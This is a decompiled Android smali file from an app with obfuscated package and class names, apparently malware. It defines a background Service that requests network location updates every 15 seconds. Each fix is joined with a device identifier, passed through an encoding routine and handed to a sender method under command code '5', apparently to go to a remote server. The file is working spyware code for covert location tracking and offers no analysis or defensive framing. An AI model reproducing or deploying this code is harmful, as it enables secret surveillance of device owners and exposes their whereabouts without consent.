.class public Lwocwvy/czyxoxmbauu/slsa/frvvkgp;
.super Landroid/app/Service;


# instance fields
.field public a:Landroid/location/LocationManager;

.field b:Lwocwvy/czyxoxmbauu/slsa/c;

.field c:Lwocwvy/czyxoxmbauu/slsa/b;

.field private d:Landroid/location/LocationListener;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp$1;

    invoke-direct {v0, p0}, Lwocwvy/czyxoxmbauu/slsa/frvvkgp$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/frvvkgp;)V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->d:Landroid/location/LocationListener;

    return-void
.end method

.method private a(Landroid/location/Location;)V
    .locals 6

    if-nez p1, :cond_0

    return-void

    :cond_0
    invoke-virtual {p1}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v0

    const-string v1, "network"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "5"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "p="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v5, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ":"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-direct {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->b(Landroid/location/Location;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ":NETWORK:"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p0, v1, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_1
    return-void
.end method

.method static synthetic a(Lwocwvy/czyxoxmbauu/slsa/frvvkgp;Landroid/location/Location;)V
    .locals 0

    invoke-direct {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->a(Landroid/location/Location;)V

    return-void
.end method

.method private b(Landroid/location/Location;)Ljava/lang/String;
    .locals 5

    if-nez p1, :cond_0

    const-string p1, ""

    return-object p1

    :cond_0
    const-string v0, "%1$.4f:%2$.4f"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x1

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object p1

    aput-object p1, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    const-string v0, ","

    const-string v1, "."

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    :try_start_0
    const-string p1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    const-string p1, "location"

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/location/LocationManager;

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->a:Landroid/location/LocationManager;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->a:Landroid/location/LocationManager;

    const-string v1, "network"

    const-wide/16 v2, 0x3a98

    const/high16 v4, 0x41200000    # 10.0f

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/frvvkgp;->d:Landroid/location/LocationListener;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return p2
.end method
